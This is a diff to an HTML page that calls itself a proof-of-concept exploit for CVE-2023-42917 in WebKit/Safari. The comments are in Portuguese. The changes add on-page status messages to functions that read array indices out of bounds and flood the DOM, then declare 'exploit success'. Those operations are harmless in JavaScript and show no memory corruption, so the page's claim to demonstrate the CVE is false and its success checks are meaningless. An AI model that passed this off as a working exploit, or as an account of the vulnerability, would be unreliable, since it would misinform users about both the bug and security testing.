@@ -9,6 +9,7 @@
     <h1>PoC CVE-2023-42917 - WebKit Safari 17.0</h1>
     <p>Este código tenta demonstrar uma manipulação de memória para fins educacionais. </p>
     <p id="result"></p>
+    <div id="status"></div> <!-- Div para exibir status do exploit -->
 
     <script>
         let isExploitSuccessful = false;  // Variável para verificar se o exploit teve sucesso
@@ -34,8 +35,10 @@
             // Acessando índice fora dos limites
             try {
                 console.log("Tentando acessar um índice fora dos limites:", view1[3]);  // Acesso fora dos limites
+                updateStatus("Manipulação de ArrayBuffer falhou - sem erro capturado.");
             } catch (e) {
                 console.error("Erro ao acessar fora dos limites do ArrayBuffer:", e);
+                updateStatus("Falha na manipulação de ArrayBuffer.");
             }
         }
 
@@ -53,6 +56,13 @@
             let p = document.createElement('p');
             p.textContent = "Texto manipulando excessivamente o DOM.";
             document.body.appendChild(p);
+
+            // Verificação de DOM
+            if (div.innerHTML.includes("A".repeat(1000))) {
+                updateStatus("Manipulação do DOM bem-sucedida.");
+            } else {
+                updateStatus("Falha na manipulação do DOM.");
+            }
         }
 
         // Função para testar overflow de arrays
@@ -65,8 +75,10 @@
             try {
                 console.log("Valor fora dos limites do array:", arr[20]);  // Acesso fora dos limites
                 isExploitSuccessful = true;  // Definir como bem-sucedido se não gerar erro
+                updateStatus("Overflow de array bem-sucedido.");
             } catch (e) {
                 console.error("Erro ao acessar fora dos limites do array:", e);
+                updateStatus("Falha no overflow de array.");
             }
         }
 
@@ -79,7 +91,13 @@
                 document.title = "Exploit Sucesso!";
             } else {
                 console.log("Exploração falhou.");
+                updateStatus("Exploração falhou.");
             }
+        }
+
+        // Função para atualizar o status na página
+        function updateStatus(message) {
+            document.getElementById("status").innerHTML = message;
         }
 
         // Chamada para funções
